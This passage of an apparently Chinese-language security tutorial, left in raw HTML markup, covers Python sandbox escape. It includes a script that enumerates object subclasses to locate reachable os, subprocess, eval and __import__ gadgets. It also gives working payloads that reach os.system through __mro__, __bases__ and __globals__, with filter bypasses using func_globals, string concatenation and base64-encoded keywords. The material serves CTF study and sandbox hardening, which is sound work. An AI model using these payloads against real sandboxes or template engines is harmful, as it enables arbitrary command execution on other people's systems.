class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'logging'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'msilib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'multiprocessing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pydoc_data'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sqlite3'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'test'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'tkinter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtledemo'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'unittest'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'urllib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'venv'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'wsgiref'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'xml'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'xmlrpc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'__future__'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'__phello__.foo'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_bootlocale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_collections_abc'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_compat_pickle'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_compression'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_dummy_thread'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_markupbase'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_osx_support'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'_pydecimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_pyio'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'_sitebuiltins'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'_strptime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_threading_local'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'_weakrefset'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'abc'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'aifc'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'antigravity'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'argparse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ast'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'asynchat'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'asyncore'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'base64'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'binhex'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'bisect'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'bz2'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'cProfile'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'calendar'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'cgi'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'cgitb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'chunk'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'cmd'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'code'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'codecs'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'codeop'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'colorsys'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'compileall'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'configparser'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'contextlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'copy'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'copyreg'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'crypt'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'csv'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'datetime'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'decimal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'difflib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'dis'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'doctest'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'dummy_threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'enum'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'filecmp'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'fileinput'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fnmatch'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'formatter'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'fractions'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'ftplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'functools'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'genericpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'getopt'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'getpass'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gettext'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'glob'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'gzip'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'hashlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'heapq'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'hmac'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'imaplib'</span>: [<span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'imghdr'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'imp'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'inspect'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'io'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'ipaddress'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'keyword'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'linecache'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'locale'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'lzma'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>],</span><br><span class="line">                <span class="string">'macpath'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'macurl2path'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mailbox'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'mailcap'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'mimetypes'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'modulefinder'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'netrc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'nntplib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ntpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'nturl2path'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'numbers'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'opcode'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'operator'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'optparse'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'os'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'pathlib'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pdb'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pickle'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pickletools'</span>: [<span class="string">'codecs'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pipes'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pkgutil'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'platform'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'plistlib'</span>: [<span class="string">'os'</span>, <span class="string">'codecs'</span>, <span class="string">'__builtins__'</span>], <span class="string">'poplib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'posixpath'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pprint'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'profile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'pstats'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pty'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'py_compile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'pyclbr'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'pydoc'</span>: [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'queue'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'quopri'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'random'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'re'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'reprlib'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'rlcompleter'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'runpy'</span>: [<span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sched'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'secrets'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'selectors'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shelve'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'shlex'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'shutil'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'signal'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'site'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'smtpd'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'smtplib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sndhdr'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'socket'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'socketserver'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'sre_compile'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'compile'</span>],</span><br><span class="line">                <span class="string">'sre_constants'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'sre_parse'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'ssl'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stat'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'statistics'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'string'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'stringprep'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'struct'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'subprocess'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sunau'</span>: [<span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'symbol'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'symtable'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'sysconfig'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tabnanny'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tarfile'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'telnetlib'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tempfile'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'textwrap'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'this'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'threading'</span>: [<span class="string">'__builtins__'</span>], <span class="string">'timeit'</span>: [<span class="string">'timeit'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'token'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tokenize'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'trace'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'traceback'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'tracemalloc'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'tty'</span>: [<span class="string">'os'</span>, <span class="string">'__builtins__'</span>], <span class="string">'turtle'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'types'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'typing'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'uu'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'uuid'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'warnings'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'wave'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'weakref'</span>: [<span class="string">'sys'</span>, <span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'webbrowser'</span>: [<span class="string">'os'</span>, <span class="string">'subprocess'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>, <span class="string">'open'</span>], <span class="string">'xdrlib'</span>: [<span class="string">'__builtins__'</span>],</span><br><span class="line">                <span class="string">'zipapp'</span>: [<span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>], <span class="string">'zipfile'</span>: [<span class="string">'os'</span>, <span class="string">'importlib'</span>, <span class="string">'sys'</span>, <span class="string">'__builtins__'</span>]&#125;</span><br><span class="line">target_modules = [<span class="string">'os'</span>, <span class="string">'platform'</span>, <span class="string">'subprocess'</span>, <span class="string">'timeit'</span>, <span class="string">'importlib'</span>, <span class="string">'codecs'</span>, <span class="string">'sys'</span>]</span><br><span class="line">target_functions = [<span class="string">'__import__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'exec'</span>, <span class="string">'eval'</span>, <span class="string">'execfile'</span>, <span class="string">'compile'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>]</span><br><span class="line">all_targets = list(set(list(find_modules.keys()) + target_modules + target_functions))</span><br><span class="line">all_modules = list(set(list(find_modules.keys()) + target_modules))</span><br><span class="line">subclasses = ().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">sub_name = [s.__name__ <span class="keyword">for</span> s <span class="keyword">in</span> subclasses]</span><br><span class="line"><span class="comment"># 第一种遍历,如:().__class__.__bases__[0].__subclasses__()[40]('./test.py').read()</span></span><br><span class="line">print(<span class="string">'----------1-----------'</span>)</span><br><span class="line"><span class="keyword">for</span> i, s <span class="keyword">in</span> enumerate(sub_name):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">        <span class="keyword">if</span> f == s:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                print(i, f)</span><br><span class="line">            <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                target = find_modules[f]</span><br><span class="line">                sub_dict = subclasses[i].__dict__</span><br><span class="line">                <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                    <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                        print(i, f, target)</span><br><span class="line">print(<span class="string">'----------2-----------'</span>)</span><br><span class="line"><span class="comment"># 第二种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('ls')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__</span><br><span class="line">        <span class="keyword">for</span> m <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> more:</span><br><span class="line">                print(i, sub, m, find_modules.get(m))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------3-----------'</span>)</span><br><span class="line"><span class="comment"># 第三种遍历,如:().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.values()[13]['eval']('__import__("os").system("ls")')</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub.__init__.__globals__.values()</span><br><span class="line">        <span class="keyword">for</span> j, v <span class="keyword">in</span> enumerate(more):</span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">if</span> f <span class="keyword">in</span> v:</span><br><span class="line">                        <span class="keyword">if</span> f <span class="keyword">in</span> target_functions:</span><br><span class="line">                            print(i, j, sub, f)</span><br><span class="line">                        <span class="keyword">elif</span> f <span class="keyword">in</span> all_modules:</span><br><span class="line">                            target = find_modules.get(f)</span><br><span class="line">                            sub_dict = v[f].__dict__</span><br><span class="line">                            <span class="keyword">for</span> t <span class="keyword">in</span> target:</span><br><span class="line">                                <span class="keyword">if</span> t <span class="keyword">in</span> sub_dict:</span><br><span class="line">                                    print(i, j, sub, f, target)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">print(<span class="string">'----------4-----------'</span>)</span><br><span class="line"><span class="comment"># 第四种遍历:如:().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']("os").system("ls")</span></span><br><span class="line"><span class="comment"># &lt;class 'warnings.catch_warnings'&gt;类很特殊，在内部定义了_module=sys.modules['warnings']，然后warnings模块包含有__builtins__，不具有通用性，本质上跟第一种方法类似</span></span><br><span class="line"><span class="keyword">for</span> i, sub <span class="keyword">in</span> enumerate(subclasses):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        more = sub()._module.__builtins__</span><br><span class="line">        <span class="keyword">for</span> f <span class="keyword">in</span> all_targets:</span><br><span class="line">            <span class="keyword">if</span> f <span class="keyword">in</span> more:</span><br><span class="line">                print(i, f)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h4 id="过滤-globals"><a href="#过滤-globals" class="headerlink" title="过滤__globals__"></a>过滤__globals__</h4><h5 id="当-globals-被禁用时，"><a href="#当-globals-被禁用时，" class="headerlink" title="当__globals__被禁用时，"></a>当__globals__被禁用时，</h5><ul>
<li>可以用func_globals直接替换；</li>
<li>使用<strong>getattribute</strong>(‘__globa’+’ls__‘)；<h5 id="如："><a href="#如：" class="headerlink" title="如："></a>如：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 原型是调用__globals__</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line"># 如果过滤了__globals__，可直接替换为func_globals</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line"># 也可以通过拼接字符串得到方式绕过</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__getattribute__(&quot;__glo&quot;+&quot;bals__&quot;)[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="过滤-mro-或-bases-或-base"><a href="#过滤-mro-或-bases-或-base" class="headerlink" title="过滤__mro__或__bases__或__base__"></a>过滤__mro__或__bases__或__base__</h4><h5 id="两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别："><a href="#两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：" class="headerlink" title="两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别："></a>两者可互相替换来Bypass其中之一被禁用的情况，但需要注意两者获取object类时的格式区别：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">[].__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[-1]</span><br><span class="line">().__class__.__mro__[-1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br></pre></td></tr></table></figure>

<h4 id="如：-1"><a href="#如：-1" class="headerlink" title="如："></a>如：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 三者互换均可</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br><span class="line"></span><br><span class="line">().__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;calc&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h4><h5 id="对关键字进行base64编码可绕过一些明文检测机制："><a href="#对关键字进行base64编码可绕过一些明文检测机制：" class="headerlink" title="对关键字进行base64编码可绕过一些明文检测机制："></a>对关键字进行base64编码可绕过一些明文检测机制：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;__import__&apos;)</span><br><span class="line">&apos;X19pbXBvcnRfXw==&apos;</span><br><span class="line">&gt;&gt;&gt; base64.b64encode(&apos;os&apos;)</span><br><span class="line">&apos;b3M=&apos;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).system(&apos;calc&apos;)</span><br><span class="line">0</span><br></pre></td></tr></table></figure>

